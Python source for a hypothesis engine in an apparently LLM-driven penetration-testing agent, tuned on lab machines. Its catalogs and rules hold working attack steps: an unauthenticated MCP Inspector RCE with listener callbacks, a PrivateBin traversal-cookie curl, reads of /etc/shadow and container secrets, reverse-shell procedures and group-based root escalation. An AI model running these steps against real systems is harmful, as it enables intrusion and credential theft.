"""HypothesisEngine — 4-layer hypothesis generation for penetration testing.

Layers:
1. Rule-based: port/service/phase → formulaic hypotheses
2. Output-driven: tool output patterns → hypothesis extraction
3. RAG-based: stub (Phase 3)
4. LLM dynamic: AgentBackend via BackendAdapter

Includes PRODUCT_CATALOG, SSRF_HOSTNAME_PATTERNS, and PRODUCT_SIGNATURES
derived from HEXSTRIKE9.9 reports and lab exercises.
"""

from __future__ import annotations

import json
import logging
import re
from typing import Any, ClassVar


def _clamp_confidence(value: Any, max_cap: float = 1.0) -> float:
    """Safely convert and clamp a confidence value to [0.0, max_cap]."""
    try:
        v = float(value)
    except (ValueError, TypeError):
        return 0.5
    return max(0.0, min(max_cap, v))

from reasoning.interfaces import (
    AttackHypothesis,
    HypothesisSource,
    HypothesisStatus,
    ReasoningEngine,
    VerificationResult,
)

logger = logging.getLogger(__name__)


def _load_external_product_catalog() -> dict[str, dict[str, Any]]:
    """Load additional product definitions from external JSON file.

    Looks for ``~/.phantom/knowledge/product_catalog.json``.
    Returns empty dict if not found (graceful degradation).
    """
    from pathlib import Path
    candidates = [
        Path.home() / ".phantom" / "knowledge" / "product_catalog.json",
        Path(__file__).parent.parent.parent / "data" / "product_catalog.json",
    ]
    for path in candidates:
        if path.exists():
            try:
                data = json.loads(path.read_text())
                logger.info("Loaded external product catalog: %s (%d entries)", path, len(data))
                return data
            except Exception:
                logger.warning("Failed to load product catalog: %s", path, exc_info=True)
    return {}


def _basename(path: str) -> str:
    """Extract basename from a Unix/Windows path string."""
    return path.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]


# ============================================================
# Knowledge catalogs
# ============================================================

PRODUCT_CATALOG: dict[str, dict[str, Any]] = {
    "zabbix": {
        "default_creds": ["Admin:zabbix"],
        "ports": [80, 8080],
        "paths": ["/api_jsonrpc.php"],
        "rce_method": "Script API (execute_on=1)",
    },
    "cacti": {
        "default_creds": ["admin:admin"],
        "ports": [80],
        "paths": ["/cacti/"],
        "rce_method": "CVE-2025-24367: graph template right_axis_label RCE",
    },
    "grafana": {
        "default_creds": ["admin:admin"],
        "ports": [3000],
        "paths": ["/login"],
        "rce_method": "Directory traversal + datasource credential leak",
    },
    "prometheus": {
        "default_creds": [],
        "ports": [9090],
        "paths": ["/api/v1/targets"],
        "rce_method": "Info leak: internal service/target enumeration",
    },
    "jenkins": {
        "default_creds": ["admin:admin"],
        "ports": [8080],
        "paths": ["/script"],
        "rce_method": "Groovy Console RCE / Job configuration shell",
    },
    "gitea": {
        "default_creds": [],
        "ports": [3000],
        "paths": ["/user/sign_up"],
        "rce_method": "Open registration → source code → .env credentials",
    },
    "gitlab": {
        "default_creds": [],
        "ports": [80, 443],
        "paths": ["/users/sign_in"],
        "rce_method": "CI/CD pipeline + Runner RCE",
    },
    "pgadmin": {
        "default_creds": ["admin@example.com:admin"],
        "ports": [80, 5050],
        "paths": ["/browser/"],
        "rce_method": "SQL execution + server config credential leak",
    },
    "phpmyadmin": {
        "default_creds": ["root:"],
        "ports": [80],
        "paths": ["/phpmyadmin/"],
        "rce_method": "SQL: INTO OUTFILE / load_file()",
    },
    "keycloak": {
        "default_creds": ["admin:admin"],
        "ports": [8080],
        "paths": ["/auth/admin/"],
        "rce_method": "Admin Console → Client Secret leak / Token forgery",
    },
    "mailpit": {
        "default_creds": [],
        "ports": [8025],
        "paths": ["/api/v1/messages"],
        "rce_method": "Email interception → password reset token capture",
    },
    "docker_api": {
        "default_creds": [],
        "ports": [2375],
        "paths": ["/containers/json"],
        "rce_method": "Container creation + host FS bind mount → escape",
    },
    "portainer": {
        "default_creds": ["admin:admin"],
        "ports": [9443],
        "paths": ["/#!/init/admin"],
        "rce_method": "Docker API management → container creation RCE",
    },
    "arcane": {
        "default_creds": [],
        "ports": [3552, 8080],
        "paths": ["/api/version", "/api/containers", "/api/health"],
        "rce_method": "Docker management API — container creation, lifecycle label injection, updater command injection",
    },
    "mcpjam": {
        "default_creds": [],
        "ports": [443, 3000],
        "paths": ["/api/mcp/connect", "/api/mcp/servers", "/api/mcp/tools/execute"],
        "rce_method": "MCP Inspector — /api/mcp/connect serverConfig.command passed to child_process.spawn() without sanitization (unauthenticated RCE)",
        "exploitation_notes": (
            "MCP uses stdio JSON-RPC: the spawned process stdin/stdout are consumed "
            "by the MCP protocol layer, so command output is NOT returned in the HTTP "
            "response (504 timeout is normal for long-running commands). "
            "To extract output: (1) write to a web-accessible file then HTTP GET it, "
            "(2) use curl/wget callback to YOUR listener, (3) write SSH authorized_keys "
            "for interactive shell, (4) use nohup+background to avoid timeout: "
            "nohup bash -c 'COMMAND > /app/dist/out.txt' & exit 0"
        ),
    },
    "privatebin": {
        "default_creds": [],
        "ports": [443, 80, 8080],
        "paths": ["/", "/?pasteid="],
        "rce_method": "LFI via template cookie manipulation; check for leaked secrets in public pastes",
        "exploitation_notes": (
            "PrivateBin LFI (GHSA-g2j9-g8r5-rg82): set template cookie to traverse "
            "paths: curl -b 'template=../../../../etc/passwd' https://target/. "
            "CHAIN: read /srv/cfg/conf.php or /app/.env for DB passwords and API keys "
            "→ use those credentials to authenticate to other services (Arcane, SSH). "
            "Container context: check /proc/1/environ for mounted secrets, "
            "/privatebin-data/ for storage configuration."
        ),
    },
    "wordpress": {
        "default_creds": ["admin:admin"],
        "ports": [80],
        "paths": ["/wp-login.php"],
        "rce_method": "Plugin vulnerabilities (WPScan enumeration)",
    },
}

# Sprint 3: Merge external product catalog at module load time (once, thread-safe)
_EXTERNAL_CATALOG_LOADED = False
if not _EXTERNAL_CATALOG_LOADED:
    _ext = _load_external_product_catalog()
    for _k, _v in _ext.items():
        if _k not in PRODUCT_CATALOG:
            PRODUCT_CATALOG[_k] = _v
    if _ext:
        logger.info("External product catalog merged: %d entries", len(_ext))
    _EXTERNAL_CATALOG_LOADED = True

SSRF_HOSTNAME_PATTERNS: dict[str, list[str]] = {
    "monitoring": [
        "zabbix", "grafana", "prometheus", "nagios", "icinga",
        "cacti", "checkmk", "netdata", "uptimekuma",
    ],
    "cicd": [
        "jenkins", "gitlab", "gitea", "drone", "argo", "argocd",
        "tekton", "concourse",
    ],
    "database": [
        "db", "mysql", "postgres", "postgresql", "mariadb",
        "redis", "mongo", "mongodb", "elasticsearch", "mssql",
    ],
    "api": [
        "api", "backend", "internal-api", "service", "gateway",
        "graphql",
    ],
    "admin": [
        "admin", "management", "portal", "dashboard", "console",
        "phpmyadmin", "pgadmin", "adminer",
    ],
    "mail": [
        "mail", "mailpit", "mailhog", "roundcube", "smtp",
    ],
    "auth": [
        "keycloak", "auth", "sso", "ldap", "oauth",
    ],
    "container": [
        "portainer", "rancher", "registry", "arcane", "docker",
    ],
    "mcp": [
        "mcp", "mcpjam", "inspector", "model-context-protocol",
    ],
    "infra": [
        "invoiceninja", "nextcloud", "minio", "vault",
        "rabbitmq", "kafka", "nats",
    ],
}

PRODUCT_SIGNATURES: dict[str, list[str]] = {
    "wordpress": ["wp-content", "wp-includes", "WordPress", "xmlrpc.php"],
    "cacti": ["Cacti", "cacti/", "graph_view.php"],
    "zabbix": ["Zabbix", "zabbix/", "api_jsonrpc.php"],
    "jenkins": ["Jenkins", "X-Jenkins", "/script", "/cli"],
    "grafana": ["Grafana", "grafana/", "/api/dashboards"],
    "gitea": ["Gitea", "gitea/", "/user/sign_up"],
    "gitlab": ["GitLab", "gitlab/", "/users/sign_in"],
    "prometheus": ["Prometheus", "/api/v1/targets", "/api/v1/query"],
    "pgadmin": ["pgAdmin", "pgadmin/", "/browser/"],
    "phpmyadmin": ["phpMyAdmin", "phpmyadmin/"],
    "adminer": ["Adminer", "adminer.php"],
    "keycloak": ["Keycloak", "/auth/realms/", "/auth/admin/"],
    "mailpit": ["Mailpit", "/api/v1/messages"],
    "mailhog": ["MailHog", "/api/v2/messages"],
    "docker_api": ["Docker Engine", "/containers/json", "/images/json"],
    "portainer": ["Portainer", "portainer/"],
    "kubernetes": ["kubernetes", "/api/v1/namespaces", "kubectl"],
    "camaleon": ["Camaleon", "camaleon_cms"],
    "arcane": ["Arcane", "GetArcane", "arcane/", "/api/containers"],
    "mcpjam": ["MCPJam", "MCP Inspector", "/api/mcp/connect", "/api/mcp/servers"],
    "privatebin": ["PrivateBin", "privatebin", "?pasteid="],
    "mcp_server": ["mcp", "Model Context Protocol", "/api/mcp/"],
}

# Port → service-based rule hypotheses
_PORT_RULES: dict[int, list[dict[str, str]]] = {
    80: [{"desc": "Web enumeration (gobuster/nikto/dirsearch)", "method": "gobuster dir -u http://{target}/ -w /usr/share/wordlists/dirb/common.txt"}],
    443: [{"desc": "HTTPS web enumeration", "method": "gobuster dir -u https://{target}/ -w /usr/share/wordlists/dirb/common.txt -k"}],
    88: [{"desc": "Kerberos ticket attacks (GetUserSPNs/GetNPUsers)", "method": "impacket-GetUserSPNs {domain}/ -dc-ip {target}"}],
    389: [{"desc": "LDAP enumeration", "method": "ldapsearch -x -H ldap://{target} -b '' -s base"}],
    1433: [{"desc": "MSSQL authentication test + EXECUTE AS check", "method": "impacket-mssqlclient {target} -windows-auth"}],
    3306: [{"desc": "MySQL authentication test + credential search", "method": "mysql -h {target} -u root"}],
    5432: [{"desc": "PostgreSQL authentication test + DATABASE_URL search", "method": "psql -h {target} -U postgres"}],
    5985: [{"desc": "WinRM authentication test (evil-winrm)", "method": "evil-winrm -i {target} -u {user} -p {pass}"}],
    5986: [{"desc": "WinRM-SSL authentication test", "method": "evil-winrm -i {target} -u {user} -p {pass} -S"}],
    2375: [{"desc": "Docker API unauthenticated access → container escape", "method": "curl http://{target}:2375/containers/json"}],
    6379: [{"desc": "Redis unauthenticated access → config write RCE", "method": "redis-cli -h {target} INFO"}],
    8080: [{"desc": "Alternative HTTP service (PrivateBin, Jenkins, Tomcat, API)", "method": "curl -s http://{target}:8080/ -o /dev/null -w '%{{http_code}}' && curl -s http://{target}:8080/ | head -50"}],
    8443: [{"desc": "Alternative HTTPS service", "method": "curl -sk https://{target}:8443/ | head -50"}],
    9443: [{"desc": "Portainer/management HTTPS", "method": "curl -sk https://{target}:9443/ | head -50"}],
    3000: [{"desc": "Gitea/Grafana/Node.js app", "method": "curl -s http://{target}:3000/ | head -50"}],
    5000: [{"desc": "Docker Registry/Flask app", "method": "curl -s http://{target}:5000/v2/ 2>/dev/null; curl -s http://{target}:5000/ | head -50"}],
}


# ============================================================
# Hypothesis generation prompt for LLM layer
# ============================================================

HYPOTHESIS_GENERATION_PROMPT = """Based on the current penetration test state, generate attack hypotheses.

Target: {target}
Objective: {objective}
Phase: {phase}
Known services: {services}
Recent findings: {findings}

Generate 1-3 hypotheses as JSON array. Each hypothesis must have:
- "description": what to try
- "expected_outcome": what success looks like
- "verification_method": shell command to verify
- "confidence": float 0.0-1.0

Respond with ONLY the JSON array, no other text."""


class HypothesisEngine(ReasoningEngine):
    """Hypothesis-driven reasoning engine — Phase 2 implementation.

    4-layer generation:
    1. Rule-based: port/service → formulaic hypotheses
    2. Output-driven: tool result patterns → hypothesis extraction
    3. RAG: stub (Phase 3)
    4. LLM dynamic: AgentBackend via BackendAdapter
    """

    def __init__(
        self,
        backend_adapter: Any | None = None,
        max_hypotheses: int = 5,
        min_confidence: float = 0.3,
        *,
        gtfobins_db: Any | None = None,
        lolbas_db: Any | None = None,
        attack_memory: Any | None = None,
        strategy_memory: Any | None = None,
    ) -> None:
        self._adapter = backend_adapter
        self._max_hypotheses = max_hypotheses
        self._min_confidence = min_confidence
        self._gtfobins_db = gtfobins_db
        self._lolbas_db = lolbas_db
        self._attack_memory = attack_memory
        self._strategy_memory = strategy_memory

        # External product catalog merge happens once at module level
        # (see _EXTERNAL_CATALOG_LOADED below)

    def set_adapter(self, adapter: Any) -> None:
        """Set or replace the backend adapter (for lazy initialization)."""
        self._adapter = adapter

    def generate_hypotheses(
        self, context: dict[str, Any]
    ) -> list[AttackHypothesis]:
        """Generate hypotheses via 4-layer fallback.

        Context keys:
            target: str — target IP
            objective: str — current objective
            services: list[ServiceEntity] — discovered services
            findings: list[str] — recent tool output
            phase: str — attack phase (recon/scan/initial_access/privesc/post_exploit)
            state_snapshot: dict — StateStore.to_dict() result
        """
        hypotheses: list[AttackHypothesis] = []

        # Layer 1: Rule-based
        hypotheses.extend(self._generate_rule_based(context))

        # Layer 2: Output-driven
        hypotheses.extend(self._generate_output_driven(context))

        # Layer 3: RAG (Phase 3 stub)
        hypotheses.extend(self._generate_rag(context))

        # Layer 4: LLM dynamic (only if adapter is available and we need more)
        if len(hypotheses) < 2 and self._adapter is not None:
            # LLM generation is async — skip in sync context
            # Controller will call generate_hypotheses_async() for LLM layer
            pass

        # Filter by minimum confidence
        hypotheses = [
            h for h in hypotheses if h.confidence >= self._min_confidence
        ]

        # Sort by confidence descending, limit to max
        hypotheses.sort(key=lambda h: h.confidence, reverse=True)
        return hypotheses[: self._max_hypotheses]

    def select_hypothesis(
        self, hypotheses: list[AttackHypothesis]
    ) -> AttackHypothesis:
        """Select the highest-confidence PENDING hypothesis.

        Falls back to all hypotheses if none are PENDING.
        """
        if not hypotheses:
            return AttackHypothesis(
                description="Generic enumeration",
                confidence=0.3,
                source=HypothesisSource.RULE,
            )
        pending = [h for h in hypotheses if h.status == HypothesisStatus.PENDING]
        candidates = pending if pending else hypotheses
        return max(candidates, key=lambda h: h.confidence)

    def verify_hypothesis(
        self, hypothesis: AttackHypothesis, result: str
    ) -> VerificationResult:
        """Verify a hypothesis against execution results.

        Phase 2: Rule-based verification via expected outcome string matching.
        Phase 4: LLM-based verification.
        """
        result_lower = result.lower()
        expected_lower = hypothesis.expected_outcome.lower()

        # Contradiction indicators — their presence negates nearby success signals
        contradiction_terms = [
            "incorrect", "invalid", "wrong", "failed", "failure",
            "denied", "rejected", "error", "refused",
        ]
        has_contradiction = any(t in result_lower for t in contradiction_terms)

        # Check for explicit success indicators (scored, not OR'd)
        success_score = 0
        if expected_lower and expected_lower in result_lower:
            success_score += 2  # Strong: expected outcome literally present
        if "access granted" in result_lower:
            success_score += 1
        if "session opened" in result_lower:
            success_score += 1
        if "shell" in result_lower and "error" not in result_lower:
            success_score += 1
        # Only count password presence if no contradiction
        if "password" in result_lower and not has_contradiction:
            success_score += 1

        # Check for explicit failure indicators
        failure_indicators = [
            "connection refused" in result_lower,
            "access denied" in result_lower,
            "authentication failed" in result_lower,
            "timeout" in result_lower and "success" not in result_lower,
            "not found" in result_lower and "vulnerability" in result_lower,
        ]
        failure_score = sum(1 for f in failure_indicators if f)

        # Require multiple success signals or strong expected match,
        # and no failure indicators. Contradictions reduce confidence.
        #
        # When contradiction terms are present, require the expected outcome
        # to literally match (score >= 3 implies expected_outcome matched +
        # additional signals). Generic keyword matches alone are insufficient.
        if failure_score > 0:
            verified = False
            delta = -0.2
        elif has_contradiction:
            # Only trust if expected outcome literally matched (score >= 3)
            if success_score >= 3:
                verified = True
                delta = 0.1  # Low confidence even with match
            else:
                verified = False
                delta = -0.1
        elif success_score >= 1:
            verified = True
            delta = min(0.1 * success_score, 0.3)
        else:
            verified = False
            delta = -0.1

        return VerificationResult(
            hypothesis_id=hypothesis.id,
            verified=verified,
            confidence_delta=delta,
            actual_outcome=result[:500],
        )

    # ------------------------------------------------------------------
    # Layer 1: Rule-based
    # ------------------------------------------------------------------

    def _generate_rule_based(
        self, context: dict[str, Any]
    ) -> list[AttackHypothesis]:
        """Generate hypotheses from port/service/state rules."""
        hypotheses: list[AttackHypothesis] = []
        target = context.get("target", "")
        services = context.get("services", [])
        phase = context.get("phase", "recon")
        state = context.get("state_snapshot", {})

        # Port-based rules
        for svc in services:
            port = svc.get("port") if isinstance(svc, dict) else getattr(svc, "port", None)
            if port and port in _PORT_RULES:
                for rule in _PORT_RULES[port]:
                    hypotheses.append(
                        AttackHypothesis(
                            description=rule["desc"],
                            verification_method=rule["method"].format(
                                target=target,
                                domain="DOMAIN",
                                user="USER",
                                **{"pass": "PASS"},
                            ),
                            confidence=0.6,
                            source=HypothesisSource.RULE,
                            expected_outcome="service information discovered",
                        )
                    )

        # Product-specific rules from detected services
        for svc in services:
            svc_name = ""
            if isinstance(svc, dict):
                svc_name = (svc.get("service_name") or "").lower()
            else:
                svc_name = (getattr(svc, "service_name", "") or "").lower()

            for product, info in PRODUCT_CATALOG.items():
                if product in svc_name:
                    creds = info.get("default_creds", [])
                    if creds:
                        hypotheses.append(
                            AttackHypothesis(
                                description=f"Default credential test: {product} ({creds[0]})",
                                confidence=0.7,
                                source=HypothesisSource.RULE,
                                expected_outcome="authenticated access",
                                verification_method=f"Test {creds[0]} on {product}",
                            )
                        )
                    if info.get("rce_method"):
                        exploit_notes = info.get("exploitation_notes", "")
                        hypotheses.append(
                            AttackHypothesis(
                                description=f"{product} exploitation: {info['rce_method']}",
                                confidence=0.5,
                                source=HypothesisSource.RULE,
                                expected_outcome="command execution",
                                reasoning=exploit_notes[:300] if exploit_notes else "",
                            )
                        )

        # Sprint 5: Subdomain-name → product catalog matching
        # When a discovered domain contains a keyword matching a known product,
        # generate hypotheses for that product even before version confirmation.
        # This addresses the v11 failure where "mcp.kobold.htb" was found but
        # MCPJam Inspector was never tested.
        domains = state.get("domains", [])
        for domain_entry in domains:
            domain_name = ""
            if isinstance(domain_entry, dict):
                domain_name = (domain_entry.get("domain") or "").lower()
            else:
                domain_name = (getattr(domain_entry, "domain", "") or "").lower()
            if not domain_name:
                continue
            # Extract subdomain part (first label)
            subdomain_part = domain_name.split(".")[0] if "." in domain_name else domain_name
            for product, info in PRODUCT_CATALOG.items():
                # Require minimum 3-char match to avoid false positives
                # (e.g., "a" in "arcane", "de" in "docker")
                if len(subdomain_part) >= 3 and (product in subdomain_part or subdomain_part in product):
                    # Match found — generate product-specific hypotheses
                    exploit_notes = info.get("exploitation_notes", "")
                    if info.get("rce_method"):
                        hypotheses.append(
                            AttackHypothesis(
                                description=f"Subdomain '{subdomain_part}' suggests {product} — test: {info['rce_method'][:80]}",
                                confidence=0.75,
                                source=HypothesisSource.RULE,
                                expected_outcome="product identified and vulnerable endpoint found",
                                verification_method=f"Probe {domain_name} on ports {info.get('ports', [])} with paths {info.get('paths', [])}",
                                reasoning=exploit_notes[:300] if exploit_notes else "",
                            )
                        )
                    for path in info.get("paths", [])[:3]:
                        hypotheses.append(
                            AttackHypothesis(
                                description=f"Probe {domain_name}{path} ({product} known endpoint)",
                                confidence=0.65,
                                source=HypothesisSource.RULE,
                                expected_outcome=f"endpoint accessible on {product}",
                                verification_method=f"curl -sk https://{domain_name}{path} | head -50",
                            )
                        )
            # Also match SSRF hostname patterns for broader product hints
            for category, names in SSRF_HOSTNAME_PATTERNS.items():
                if subdomain_part in names:
                    hypotheses.append(
                        AttackHypothesis(
                            description=f"Subdomain '{subdomain_part}' matches {category} pattern — enumerate service",
                            confidence=0.6,
                            source=HypothesisSource.RULE,
                            expected_outcome=f"{category} service discovered",
                            verification_method=f"curl -sk https://{domain_name}/ | head -50",
                        )
                    )

        # SSRF discovery → hostname-based internal exploration
        findings = context.get("findings") or []
        findings_text = " ".join(str(f) for f in findings).lower()
        if "ssrf" in findings_text or "server-side request" in findings_text:
            hostnames = []
            for category, names in SSRF_HOSTNAME_PATTERNS.items():
                hostnames.extend(names[:3])
            hypotheses.append(
                AttackHypothesis(
                    description="SSRF → hostname-based internal service exploration",
                    confidence=0.7,
                    source=HypothesisSource.RULE,
                    expected_outcome="internal service discovered",
                    verification_method=f"Probe hostnames: {', '.join(hostnames[:10])}",
                    reasoning="Docker/K8s environments use hostname resolution; IP-based SSRF fails",
                )
            )

        # Container post-exploitation
        if "container" in findings_text or "docker" in findings_text:
            hypotheses.append(
                AttackHypothesis(
                    description="Container environment: extract secrets and environment variables",
                    confidence=0.8,
                    source=HypothesisSource.RULE,
                    expected_outcome="credentials or API keys extracted",
                    verification_method="strings /proc/1/environ; ls /secrets/ 2>/dev/null; cat /app/.env 2>/dev/null",
                )
            )

        # Sprint 6: RCE confirmed → shell establishment hypotheses
        # v12 gap: RCE was confirmed (PARTIAL outcome) but no hypothesis was
        # generated for converting it to an interactive shell.
        if "rce" in findings_text or "command execution" in findings_text or "command injection" in findings_text:
            hypotheses.append(
                AttackHypothesis(
                    description="RCE confirmed → establish interactive shell (follow RCE TO SHELL procedure)",
                    confidence=0.9,
                    source=HypothesisSource.RULE,
                    expected_outcome="interactive shell obtained",
                    verification_method="Try reverse shell, then bind shell, then SSH key injection, then web shell",
                    reasoning=(
                        "Step 0: start listener (nc -lvnp 4444), verify YOUR IP. "
                        "Step 1: reverse shell variants (bash/python/nc). "
                        "Step 2: bind shell if egress filtered. "
                        "Step 3: SSH key injection. "
                        "Step 4: web shell. "
                        "For API-based RCE (MCP/Docker): use nohup+background, avoid stdio redirect."
                    ),
                )
            )

        # Sprint 6: LFI→credential chain hypothesis
        # v12 found PrivateBin LFI but failed to chain it to credential extraction
        if "lfi" in findings_text or "file inclusion" in findings_text or "file read" in findings_text or "path traversal" in findings_text:
            hypotheses.append(
                AttackHypothesis(
                    description="LFI→credential chain: read config files for API keys, DB passwords, tokens",
                    confidence=0.85,
                    source=HypothesisSource.RULE,
                    expected_outcome="credentials extracted from config files → pivot to other services",
                    verification_method=(
                        "Read: /app/.env, /srv/cfg/conf.php, /proc/self/environ, "
                        "/var/www/html/config.php, /etc/shadow"
                    ),
                    reasoning="LFI alone rarely gives a shell — credentials found via LFI enable "
                              "authentication to other services (API, SSH, database)",
                )
            )

        # Credential discovery → password spray
        creds_in_state = state.get("credentials", [])
        if creds_in_state and phase in ("initial_access", "post_exploit"):
            hypotheses.append(
                AttackHypothesis(
                    description="Password spray with discovered credentials across all hosts",
                    confidence=0.6,
                    source=HypothesisSource.RULE,
                    expected_outcome="additional host access",
                )
            )

        # AD environment detection
        def _svc_name(s: Any) -> str:
            if isinstance(s, dict):
                return (s.get("service_name") or "").lower()
            return (getattr(s, "service_name", "") or "").lower()

        def _svc_port(s: Any) -> int:
            if isinstance(s, dict):
                return s.get("port", 0) or 0
            return getattr(s, "port", 0) or 0

        ad_ports = {88, 389, 636, 3268}
        ad_names = {"kerberos", "ldap", "msrpc", "domain"}
        is_ad = any(
            _svc_port(s) in ad_ports or any(n in _svc_name(s) for n in ad_names)
            for s in services
        )
        if is_ad:
            hypotheses.append(
                AttackHypothesis(
                    description="AD environment: BloodHound enumeration → delegation/dMSA check",
                    confidence=0.7,
                    source=HypothesisSource.RULE,
                    expected_outcome="AD attack path identified",
                    verification_method="bloodhound-python -d {domain} -u {user} -p {pass} -c All",
                )
            )

        # LPE hypotheses from LOLBAS/GTFOBins knowledge bases
        hypotheses.extend(self._generate_lpe_hypotheses(context))

        return hypotheses

    # ------------------------------------------------------------------
    # Layer 1b: LPE hypothesis generation via LOLBAS/GTFOBins
    # ------------------------------------------------------------------

    # Patterns to extract binaries from sudo -l and SUID output.
    _SUDO_BINARY_RE: ClassVar[re.Pattern[str]] = re.compile(
        r"\((?:root|ALL)\)[^\n]*?NOPASSWD:\s*(.+)", re.IGNORECASE
    )
    _SUID_BINARY_RE: ClassVar[re.Pattern[str]] = re.compile(
        r"^(/\S+)", re.MULTILINE
    )

    def _generate_lpe_hypotheses(
        self, context: dict[str, Any]
    ) -> list[AttackHypothesis]:
        """Generate privilege escalation hypotheses from LOLBAS/GTFOBins.

        Parses ``context["findings"]`` for sudo -l and SUID/capability
        output, then cross-references against the offline knowledge bases.
        """
        hypotheses: list[AttackHypothesis] = []
        findings: list[str] = context.get("findings") or []
        combined = "\n".join(str(f) for f in findings)

        # --- Linux: GTFOBins ---
        if self._gtfobins_db and getattr(self._gtfobins_db, "is_available", False):
            # Parse sudo -l output
            for match in self._SUDO_BINARY_RE.finditer(combined):
                binaries_str = match.group(1)
                for token in binaries_str.split(","):
                    binary = token.strip().split()[0] if token.strip() else ""
                    if not binary:
                        continue
                    if self._gtfobins_db.can_escalate(binary, "sudo"):
                        code = self._gtfobins_db.get_escalation_code(binary, "sudo")
                        hypotheses.append(
                            AttackHypothesis(
                                description=f"Escalate via sudo {_basename(binary)}",
                                confidence=0.8,
                                source=HypothesisSource.RULE,
                                expected_outcome="root shell obtained",
                                verification_method=code or "",
                            )
                        )

            # Parse SUID binaries (find -perm -4000 output)
            if "-perm" in combined or "suid" in combined.lower():
                for match in self._SUID_BINARY_RE.finditer(combined):
                    binary = match.group(1)
                    if self._gtfobins_db.can_escalate(binary, "suid"):
                        code = self._gtfobins_db.get_escalation_code(binary, "suid")
                        hypotheses.append(
                            AttackHypothesis(
                                description=f"Escalate via SUID {_basename(binary)}",
                                confidence=0.8,
                                source=HypothesisSource.RULE,
                                expected_outcome="root shell obtained",
                                verification_method=code or "",
                            )
                        )

        # --- Windows: LOLBAS ---
        if self._lolbas_db and getattr(self._lolbas_db, "is_available", False):
            # Look for Windows binary names in findings
            for finding in findings:
                finding_lower = str(finding).lower()
                for category in ("Execute", "AWL Bypass"):
                    entries = self._lolbas_db.search_by_category(category)
                    for entry in entries:
                        entry_stem = entry.name.lower().replace(".exe", "")
                        if entry_stem in finding_lower:
                            cmds = entry.get_commands_by_category(category)
                            hypotheses.append(
                                AttackHypothesis(
                                    description=f"LOLBin execution via {entry.name}",
                                    confidence=0.7,
                                    source=HypothesisSource.RULE,
                                    expected_outcome="code execution",
                                    verification_method=cmds[0].command if cmds else "",
                                )
                            )
                            break  # one hypothesis per entry

        # Sprint 6: Group-based privilege escalation detection
        # v12/Kobold: user was in docker group → root, but NIRVANA never detected it.
        combined_lower = combined.lower()
        _GROUP_PRIVESC: dict[str, tuple[str, float]] = {
            "docker": (
                "Docker group → mount host FS: docker run -v /:/hostfs -it IMAGE chroot /hostfs bash",
                0.95,
            ),
            "lxd": (
                "LXD group → privileged container: lxc init IMAGE c -c security.privileged=true",
                0.9,
            ),
            "staff": (
                "Staff group → write /usr/local/bin: create malicious binary in PATH for cron/root execution",
                0.75,
            ),
            "disk": (
                "Disk group → raw device access: debugfs /dev/sda → read /root/root.txt",
                0.85,
            ),
            "adm": (
                "Adm group → read logs: grep -r password /var/log/ for credential harvesting",
                0.6,
            ),
        }
        for group_name, (method, conf) in _GROUP_PRIVESC.items():
            # Match "groups: docker" or "docker : user" or "(docker)" patterns
            if re.search(rf"\b{group_name}\b", combined_lower):
                hypotheses.append(
                    AttackHypothesis(
                        description=f"Privilege escalation via {group_name} group membership",
                        confidence=conf,
                        source=HypothesisSource.RULE,
                        expected_outcome="root shell or host filesystem access",
                        verification_method=method,
                        reasoning=f"User is member of '{group_name}' group — this is a well-known privesc vector.",
                    )
                )

        # Container escape hypotheses
        container_indicators = ["dockerenv", "docker", "overlay", "container", "/proc/1/cgroup"]
        if any(ind in combined_lower for ind in container_indicators):
            hypotheses.append(
                AttackHypothesis(
                    description="Container escape: check docker.sock, capabilities, privileged mode",
                    confidence=0.7,
                    source=HypothesisSource.RULE,
                    expected_outcome="host filesystem access or host shell",
                    verification_method=(
                        "ls -la /var/run/docker.sock; capsh --print; "
                        "cat /proc/1/cgroup; fdisk -l 2>/dev/null"
                    ),
                    reasoning="Container detected — check for escape vectors: "
                              "mounted docker.sock, CAP_SYS_ADMIN, privileged mode, host mounts.",
                )
            )
            # Container code execution → host escalation via bind-mount overlap
            hypotheses.append(
                AttackHypothesis(
                    description="Container code execution → host escalation via writable bind-mount",
                    confidence=0.75,
                    source=HypothesisSource.RULE,
                    expected_outcome="host-level file read or code execution via shared mount",
                    verification_method=(
                        "cat /proc/self/mounts | grep -v 'overlay\\|proc\\|sysfs\\|devpts\\|tmpfs\\|cgroup'; "
                        "find / -writable -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -30; "
                        "find / -name '*.txt' 2>/dev/null | grep -i flag"
                    ),
                    reasoning=(
                        "Containers frequently have host directories bind-mounted inside. "
                        "Enumerate /proc/self/mounts to identify host paths accessible from "
                        "within the container. If a writable mount point contains files that "
                        "a privileged host process loads (service config, cron data, interpreter "
                        "include), overwriting that file with a payload achieves host code "
                        "execution. Correlate writable container paths with host root process "
                        "open file handles (lsof on host side) to find the overlap."
                    ),
                )
            )

        # Supplementary group membership may grant write access to privileged execution paths
        # Condition: id output shows groups beyond the primary gid (comma-separated groups list)
        if re.search(r"groups=\d+\([^)]+\),\d+", combined_lower):
            hypotheses.append(
                AttackHypothesis(
                    description="Supplementary group access → writable file in privileged process execution path",
                    confidence=0.72,
                    source=HypothesisSource.RULE,
                    expected_outcome="code execution as privileged user via group-writable file",
                    verification_method=(
                        "id; "
                        "for g in $(id -G); do find / -group $g -writable 2>/dev/null; done "
                        "| grep -v '/proc\\|/sys\\|/dev' | head -30; "
                        "ps aux | grep -v grep | grep '^root'"
                    ),
                    reasoning=(
                        "Supplementary groups are commonly used to grant shared write access "
                        "to data directories consumed by privileged services. The attack pattern: "
                        "identify group-writable files, identify which root-owned processes read "
                        "those files (via lsof, strace, or service inspection), then plant a "
                        "payload in the writable file to execute code when the privileged process "
                        "next loads it (cron trigger, service restart, request handling)."
                    ),
                )
            )

        return hypotheses

    # ------------------------------------------------------------------
    # Layer 2: Output-driven
    # ------------------------------------------------------------------

    def _generate_output_driven(
        self, context: dict[str, Any]
    ) -> list[AttackHypothesis]:
        """Extract hypotheses from recent tool output patterns."""
        hypotheses: list[AttackHypothesis] = []
        findings = context.get("findings") or []
        findings_text = " ".join(str(f) for f in findings)

        # Product detection via signatures
        for product, signatures in PRODUCT_SIGNATURES.items():
            for sig in signatures:
                if sig in findings_text:
                    catalog = PRODUCT_CATALOG.get(product, {})
                    desc = f"Detected {product}"
                    if catalog.get("rce_method"):
                        desc += f" → {catalog['rce_method']}"
                    hypotheses.append(
                        AttackHypothesis(
                            description=desc,
                            confidence=0.7,
                            source=HypothesisSource.PATTERN,
                            expected_outcome="exploitation or credential access",
                        )
                    )
